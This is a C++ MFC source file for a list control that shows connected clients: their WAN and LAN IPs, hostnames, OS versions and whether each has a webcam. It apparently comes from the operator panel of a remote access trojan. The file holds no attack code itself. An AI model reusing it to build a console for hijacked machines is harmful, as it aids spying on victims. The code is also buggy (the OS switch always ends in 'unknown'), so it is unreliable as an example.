// MyListCtrl.cpp : 实现文件
//

#include "stdafx.h"
#include "MyListCtrl.h"
#include "IOCPServer.h"
typedef struct
{
	CString	title;
	double		nWidth;
}COLUMNSTRUCT;
COLUMNSTRUCT m_Column_Data[] = 
{
	{_T("ID")	 ,				0.05},
	{_T("Wan/Lan"),				0.2	},
	{_T("Hostname"),			0.15},
	{_T("Version"),				0.2	},
	{_T("Relay"),				0.1	},
	{_T("Comment"),				0.3	},
};
// MyListCtrl

IMPLEMENT_DYNAMIC(MyListCtrl, CListCtrl)

MyListCtrl::MyListCtrl()
{
	
	m_Column_Count = 6;
	m_nItemCount = 0;

}

MyListCtrl::~MyListCtrl()
{
}


BEGIN_MESSAGE_MAP(MyListCtrl, CListCtrl)
END_MESSAGE_MAP()



// MyListCtrl 消息处理程序


BOOL MyListCtrl::init()
{
	CRect rect;
	this->GetClientRect(&rect);
	int width = rect.Width();
	for (int i=0;i<m_Column_Count;i++)
	{
		InsertColumn(i,m_Column_Data[i].title,LVCFMT_LEFT,(int)width*m_Column_Data[i].nWidth);
	}
	return TRUE;
}


BOOL MyListCtrl::changeWidth(void)
{
	CRect rect;
	this->GetClientRect(&rect);
	int width = rect.Width();
	for (int i=0;i<m_Column_Count;i++)
	{
		SetColumnWidth(i,(int)width*m_Column_Data[i].nWidth);
	}
	return TRUE;
}
BOOL MyListCtrl::AddToList(ClientContext * pContext)
{
	LOGININFO*	LoginInfo;
	if (pContext == NULL)
		return FALSE;
 	CString	strToolTipsText, strOS;
	try
	{
		int nCnt = GetItemCount();
		// 不合法的数据包
		if (pContext->m_DeCompressionBuffer.GetBufferLen() != sizeof(LOGININFO))
			return -1;
		LoginInfo = (LOGININFO*)pContext->m_DeCompressionBuffer.GetBuffer();
		// ID
		CString	str;
		str.Format(_T("%d"),m_nItemCount++);	
		int i = InsertItem(nCnt, str);

		//  Ip  wan/lan 显示
		// 外网IP
		sockaddr_in  sockAddr;
		memset(&sockAddr, 0, sizeof(sockAddr));
		int nSockAddrLen = sizeof(sockAddr);
		BOOL bResult = getpeername(pContext->m_Socket,(SOCKADDR*)&sockAddr, &nSockAddrLen);

		CString IPAddress;
		if (INVALID_SOCKET != bResult)
			IPAddress = inet_ntoa(sockAddr.sin_addr); 
		else
			IPAddress = _T("");
		// 内网IP
		CString LanIPstr;
		LanIPstr = ANSIToUnicode(inet_ntoa((LoginInfo->IPAddress)));
		IPAddress += _T("'\'") + LanIPstr ;
		SetItemText(i, 1, IPAddress);

		// 主机名
		CString HostNameStr;
		HostNameStr = ANSIToUnicode(LoginInfo->HostName);
		SetItemText(i, 2, HostNameStr);
		// 系统
		// 显示输出信息
		CString pszOS;
		switch (LoginInfo->OsVerInfoEx.dwPlatformId)
		{
		case VER_PLATFORM_WIN32_NT:
			if (LoginInfo->OsVerInfoEx.dwMajorVersion <= 4 )
				pszOS = "NT";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 )
				pszOS = "Windows 2000";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 )
				pszOS = "Windows XP";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 5 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wSuiteMask & VER_SUITE_WH_SERVER))
				pszOS = "Windows Home Server ";
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
				pszOS = "Windows Vista";  
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 0 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
				pszOS = "Windows Server 2008";  
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
				pszOS = "Windows 7";  
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 1 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
				pszOS = "Windows Server 2008 R2";  
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
				pszOS = "Windows 8";  
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 2 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
				pszOS = "Windows Server 2012";  
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 && (LoginInfo->OsVerInfoEx.wProductType == VER_NT_WORKSTATION))
				pszOS = "Windows 8.1";  
			if ( LoginInfo->OsVerInfoEx.dwMajorVersion == 6 && LoginInfo->OsVerInfoEx.dwMinorVersion == 3 && (LoginInfo->OsVerInfoEx.wProductType != VER_NT_WORKSTATION))
				pszOS = "Windows Server 2012 R2";  
		default:
			pszOS = "unknown";
		}
		strOS.Format
			(
			_T("%s SP%d (Build %d)'/' %dMHz"),
			//OsVerInfo.szCSDVersion,
			pszOS, 
			LoginInfo->OsVerInfoEx.wServicePackMajor, 
			LoginInfo->OsVerInfoEx.dwBuildNumber,
			LoginInfo->CPUClockMhz
			);
		SetItemText(i, 3, strOS);
		// Speed
		str.Format(_T("%d"), LoginInfo->dwSpeed);
		SetItemText(i, 4, str);

		str = LoginInfo->bIsWebCam ? "camera" : "--";
		SetItemText(i, 5, str);
		// 指定唯一标识
		SetItemData(i, (DWORD) pContext);
	}catch(...){}

	m_nItemCount++;
	return TRUE;
}